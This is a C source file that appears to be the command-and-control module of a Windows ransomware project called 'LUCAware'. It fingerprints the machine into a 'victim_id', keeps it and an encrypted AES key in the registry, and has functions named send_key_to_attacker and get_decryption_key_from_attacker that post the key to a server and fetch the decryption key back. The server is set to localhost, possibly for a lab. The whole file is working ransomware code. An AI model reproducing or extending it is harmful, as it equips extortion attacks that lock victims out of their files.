#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#include "mbedtls/base64.h"

#include "get_relative_path.h"
#include "store_in_register.h"

#pragma comment(lib, "ws2_32.lib")

#define AES_KEY_SIZE 16           // 128-bit AES
#define RSA_KEY_SIZE 128          // 1024-bit RSA
#define REG_PATH "Software\\LUCAware"
#define ID_VALUE_NAME "MyID"
#define ENCRYPTED_KEY_NAME "EnKey"
#define DECRYPTION_KEY_NAME "DecryptionKey"

WSADATA wsa;
SOCKET sock;
struct sockaddr_in server;

int generate_victim_id(ULONGLONG *out_id)
{
    char comp_name[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD name_len = MAX_COMPUTERNAME_LENGTH + 1;
    DWORD serial_num = 0;

    if (!out_id)
        return -1;

    // Get computer name
    if (!GetComputerNameA(comp_name, &name_len))
    {
        strcpy_s(comp_name, sizeof(comp_name), "PC");
        name_len = (DWORD)strlen(comp_name);
    }

    // Get C: drive serial number
    if (!GetVolumeInformationA(
            "C:\\",
            NULL, 0,
            &serial_num,
            NULL, NULL,
            NULL, 0))
    {
        return -1;
    }

    // Simple deterministic mixing
    ULONGLONG id = 0;

    // Mix computer name bytes
    for (DWORD i = 0; i < name_len; i++)
    {
        id ^= (ULONGLONG)(unsigned char)comp_name[i];
        id = (id << 5) | (id >> (64 - 5));  // rotate left
        id *= 1315423911ULL;                // arbitrary prime
    }

    // Mix serial number
    id ^= (ULONGLONG)serial_num;
    id = (id << 13) | (id >> (64 - 13));
    id *= 11400714819323198485ULL;

    *out_id = id;
    return 0;
}

int EnsureIDExists(void)
{
    storage_context_t ctx = { REG_PATH };
    ULONGLONG id;

    /* If already exists, nothing to do */
    if (load_qword(&ctx, ID_VALUE_NAME, &id) == 0)
        return 1;

    /* Generate new ID */
    if (generate_victim_id(&id) != 0)
        return 0;

    /* Store it */
    if (store_qword(&ctx, ID_VALUE_NAME, id) != 0)
        return 0;

    return 1;
}

/* Convert binary data to base64 as we will send key to the attacker's server in a JSON */
int base64_encode(const unsigned char *bin_input, 
                             size_t bin_input_len,
                             char **base64_output, 
                             size_t *base64_output_len) {
    size_t written = 0;
    
    if (!bin_input || !base64_output || !base64_output_len || bin_input_len == 0) {
        fprintf(stderr, "Invalid parameters\n");
        return -1;  
    }
    
    // calculate buffer size needed - mbedtls call with dst buffer = NULL and its len = 0
    size_t buffer_size = 0;
    mbedtls_base64_encode(NULL, 0, &buffer_size, bin_input, bin_input_len);
    
    // allocate buffer
    unsigned char *buffer = malloc(buffer_size);
    
    // encode to base64 using mbedtls
    if (mbedtls_base64_encode(buffer, buffer_size, &written, bin_input, bin_input_len) != 0) {
        free(buffer);
        fprintf(stderr, "Failed to encode to base64\n");
        return -1;
    }

    buffer[written] = '\0';

    // return string in base64 and its len
    *base64_output = (char *)buffer;
    *base64_output_len = written;
    
    return 0;
}

int ensure_web_setup() {
    // initialize windows sockets
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }
    
    // create tcp socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }
    
    // setup server address
    server.sin_family = AF_INET;
    server.sin_port = htons(8000);
    server.sin_addr.s_addr = inet_addr("127.0.0.1"); 

    return 0;
}

void web_cleanup() {
    closesocket(sock);
    WSACleanup();
}

int get_or_create_victim_id(ULONGLONG *id)
{
    if (!EnsureIDExists())
        return -1;

    storage_context_t ctx = { REG_PATH };
    return load_qword(&ctx, ID_VALUE_NAME, id);
}

int get_encrypted_aes_key(unsigned char *buf, size_t len)
{
    storage_context_t ctx = { REG_PATH };
    return load_value(&ctx, ENCRYPTED_KEY_NAME, buf, len);
}

int store_aes_key(const unsigned char *buf, size_t len)
{
    storage_context_t ctx = { REG_PATH };
    return store_value(&ctx, DECRYPTION_KEY_NAME, buf, len);
}

int http_post_json(const char *host, int port, const char *path, const char *json)
{
    if (ensure_web_setup() != 0)
        return -1;

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        web_cleanup();
        return -1;
    }

    char request[1024];
    snprintf(request, sizeof(request),
             "POST %s HTTP/1.1\r\n"
             "Host: %s:%d\r\n"
             "Content-Type: application/json\r\n"
             "Content-Length: %zu\r\n"
             "\r\n"
             "%s",
             path, host, port, strlen(json), json);

    int sent = send(sock, request, strlen(request), 0);

    char buffer[1024];
    recv(sock, buffer, sizeof(buffer), 0);

    web_cleanup();
    return (sent > 0) ? 0 : -1;
}

int http_get(const char *host, int port, const char *path, unsigned char *out_buf, size_t expected_size)
{
    if (ensure_web_setup() != 0)
        return -1;

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        web_cleanup();
        return -1;
    }

    char request[256];
    snprintf(request, sizeof(request),
             "GET %s HTTP/1.1\r\n"
             "Host: %s:%d\r\n"
             "\r\n",
             path, host, port);

    if (send(sock, request, strlen(request), 0) <= 0) {
        web_cleanup();
        return -1;
    }

    char buffer[256];
    int total = 0, headers_end = 0, body_received = 0;
    char *body_start = NULL;

    while (body_received < expected_size) {
        int r = recv(sock, buffer + total, sizeof(buffer) - total, 0);
        if (r <= 0) {
            web_cleanup();
            return -1;
        }
        total += r;

        if (!headers_end) {
            if (memcmp(buffer, "HTTP/1.1 200", 12) != 0 &&
                memcmp(buffer, "HTTP/1.0 200", 12) != 0) {
                web_cleanup();
                return -1;
            }

            body_start = strstr(buffer, "\r\n\r\n");
            if (body_start) {
                headers_end = 1;
                body_start += 4;

                int available = (buffer + total) - body_start;
                if (available > expected_size) available = expected_size;
                memcpy(out_buf, body_start, available);
                body_received = available;
            }
        } else {
            int to_copy = expected_size - body_received;
            if (to_copy > r) to_copy = r;
            memcpy(out_buf + body_received, buffer, to_copy);
            body_received += to_copy;
        }

        total = 0;
    }

    web_cleanup();
    return 0;
}

int send_key_to_attacker(void)
{
    ULONGLONG victim_id;
    if (get_or_create_victim_id(&victim_id) != 0)
        return -1;

    unsigned char key_data[RSA_KEY_SIZE];
    if (get_encrypted_aes_key(key_data, sizeof(key_data)) != 0)
        return -1;

    char *base64_key = NULL;
    size_t base64_len = 0;
    if (base64_encode(key_data, sizeof(key_data), &base64_key, &base64_len) != 0)
        return -1;

    char json[512];
    snprintf(json, sizeof(json),
             "{\"victim_id\":%llu, \"encrypted_key\":\"%s\"}",
             victim_id, base64_key);

    int result = http_post_json("127.0.0.1", 8000, "/api/keys", json);

    free(base64_key);
    return result;
}

int get_decryption_key_from_attacker(void)
{
    ULONGLONG victim_id;
    if (get_or_create_victim_id(&victim_id) != 0)
        return -1;

    unsigned char aes_key[AES_KEY_SIZE];

    char path[128];
    snprintf(path, sizeof(path),
             "/api/key/%llu",
             (unsigned long long)victim_id);

    if (http_get("127.0.0.1", 8000, path, aes_key, AES_KEY_SIZE) != 0)
        return -1;

    if (store_aes_key(aes_key, AES_KEY_SIZE) != 0)
        return -1;

    return 0;
}